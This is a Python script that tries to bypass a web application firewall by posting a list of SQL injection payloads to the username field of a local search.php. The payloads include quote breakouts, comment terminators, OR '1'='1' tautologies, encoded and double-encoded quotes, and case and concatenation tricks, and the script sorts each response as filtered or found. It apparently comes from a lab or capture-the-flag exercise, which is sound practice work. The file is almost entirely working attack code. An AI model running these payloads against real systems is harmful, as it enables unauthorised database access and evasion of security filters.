#!/usr/bin/env python3
"""
SQL Injection testing on /search.php with username parameter
Test various bypass techniques against the WAF filter
"""
import requests
import urllib.parse

url = "http://127.0.0.1:8080/search.php"

# Test payloads for SQL injection bypass
payloads = [
    # Basic tests
    "admin",
    "admin'",
    'admin"',
    # Comment-based
    "admin'#",
    'admin"#',
    "admin'-- -",
    # Boolean-based with bypasses
    "admin'#abc",
    "admin'--",
    # Encoding attempts
    "admin%27",
    "admin%27%20OR%20%27%31%27%3D%271",
    "admin%2527",
    "admin'/**/OR/**/'1'='1",
    # Alternative syntax
    "admin') OR ('1'='1",
    'admin" OR "1"="1',
    # Case variations
    "admin' oR '1'='1",
    "admin' Or '1'='1",
    "adm'+'in",
    # Character bypass
    "adm'||'in",
]

results = []

for payload in payloads:
    data = {"username": payload}
    try:
        response = requests.post(url, data=data, timeout=10)
        results.append({
            "payload": payload,
            "status": response.status_code,
            "length": len(response.text),
            "indicator": "filtered" if "filtered" in response.text.lower() else ("exists" if "exists" in response.text.lower() else "other"),
            "snippet": response.text[:150]
        })
    except Exception as e:
        results.append({
            "payload": payload,
            "error": str(e)
        })

# Print results
print("=" * 80)
print("SQL Injection Test Results for /search.php")
print("=" * 80)
for r in results:
    if "error" in r:
        print(f"[ERROR] {r['payload']}: {r['error']}")
    else:
        status = "FILTERED" if r['indicator'] == 'filtered' else ("FOUND" if r['indicator'] == 'exists' else "OTHER")
        print(f"[{status}] Payload: {r['payload'][:50]:50} | Len: {r['length']} | Snippet: {r['snippet'][:80]}")
        print("-" * 80)

print("\n" + "=" * 80)
print("SUMMARY:")
print("=" * 80)
filtered = sum(1 for r in results if r.get('indicator') == 'filtered')
found = sum(1 for r in results if r.get('indicator') == 'exists')
print(f"Total payloads tested: {len(payloads)}")
print(f"Filtered by WAF: {filtered}")
print(f"Username found: {found}")

